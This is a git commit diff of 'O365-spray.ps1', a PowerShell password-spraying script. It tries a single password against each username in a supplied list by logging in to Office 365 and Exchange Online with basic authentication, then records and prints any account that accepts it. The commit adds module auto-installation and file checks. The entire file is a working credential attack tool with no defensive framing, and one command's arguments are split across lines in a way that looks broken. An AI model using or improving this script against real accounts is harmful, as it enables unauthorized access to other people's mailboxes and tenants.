f3282577bbadeeb8d00fc13b6b5cc95a27a0d89a
Coyote Technology Solutions <36348411+CoyoteTech@users.noreply.github.com>
2018-12-12 22:09:57 -0600

    Update O365-spray.ps1
    Adding some code to install msonline if it isn't present on the machine, adding file input validation and creation if missing output file

--- O365-spray.ps1
+++ O365-spray.ps1
@@ -1,32 +1,79 @@
 Param(
-
 [Parameter(Position = 0, Mandatory = $True)]
-    [string]
-    $Password = "",
-
+[String]$Password,
 [Parameter(Position = 1, Mandatory = $True)]
-    [string]
-    $UserList = ""
+[String]$UserList
 )
 
-$filename = "results_" + (get-date -Format "ddMMyyyyhhmmss") + ".txt"
+#Testing output file path and creating file if neccessary 
+$FileName = "results_" + (get-date -Format "ddMMyyyyhhmmss") + ".txt"
+If(!(Test-Path -Path $FileName))
+{
+    Write-Host "$FileName is missing, creating file"
+    New-Item -Path $FileName -ItemType File | Out-Null
+}
 
-Import-Module MSOnline
+#Testing path to file passed in with $UserList
+If(!(Test-Path -Path $UserList))
+{
+    Write-Host "The UserList file $UserList is not a valid file."
+    Write-Host "Please try again with a correct file."
+    Exit
+}
+
+#Checking for MSOnline Module and Installing if not present
+If(Get-Module -ListAvailable | Where-Object{$_.Name -eq "MSOnline"})
+{
+    Try
+    {
+        Write-Host "Loading MSOnline Powershell Module"
+        Import-Module MSOnline
+    }
+    Catch
+    {
+        Write-Host $_.Exception.Message
+        Write-Host $_.InvocationInfo.PositionMessage
+        Throw "Unable to execute script, unable to load MSOnline Powershell Module"
+    }
+}
+Else
+{
+    Try
+    {
+        Write-Host "Installing NuGet Package Provider"
+        Install-PackageProvider -Name NuGet -Force
+        $NuGetPath = (Get-PackageProvider -Name NuGet -ListAvailable).ProviderPath
+        If(-not(Get-PackageProvider -Name Nuget))
+        {
+            Import-PackageProvider -Path $NuGetpath
+        }
+        Write-Host "Installing MSOline Powershell Module"
+        Install-Module MSOnline -Force
+    }
+    Catch
+    {
+        Write-Host $_.Exception.Message
+        Write-Host $_.InvocationInfo.PositionMessage
+        Throw "Unable to execute script, unable to install MSOnline Powershell Module"
+    }
+}
 
 $x=0
-foreach ($username in get-content $UserList)
+ForEach ($UserName in (Get-Content $UserList))
 {
-$x=$x+1;
-Write-Host "User #$x"
-Write-Host "Trying username $username"
-$O365password = $password | ConvertTo-SecureString -asPlainText -Force
-$credential = New-Object System.Management.Automation.PSCredential($username,$O365password)
-$O365Session = New-PSSession –ConfigurationName Microsoft.Exchange -ConnectionUri https://ps.outlook.com/powershell -Credential $credential 
--Authentication Basic -AllowRedirection
-Connect-MsolService –Credential $credential
-$Domains = Get-Msoldomain
-if ($Domains) { Add-Content -Path "$filename" -Value "$username is using password $Password"
-write-host $username is using password $Password 
-exit
-}
+    $x++
+    Write-Host "User #$x"
+    Write-Host "Trying username $UserName"
+    $O365Password = $Password | ConvertTo-SecureString -asPlainText -Force
+    $Credential = New-Object System.Management.Automation.PSCredential($UserName,$O365Password)
+    $O365Session = New-PSSession –ConfigurationName Microsoft.Exchange -ConnectionUri https://ps.outlook.com/powershell -Credential $credential 
+    -Authentication Basic -AllowRedirection
+    Connect-MsolService –Credential $Credential
+    $Domains = Get-Msoldomain
+    If ($Domains) 
+    { 
+        Add-Content -Path "$FileName" -Value "$UserName is using password $Password"
+        Write-Host $username is using password $Password 
+        Exit
+    }
 }
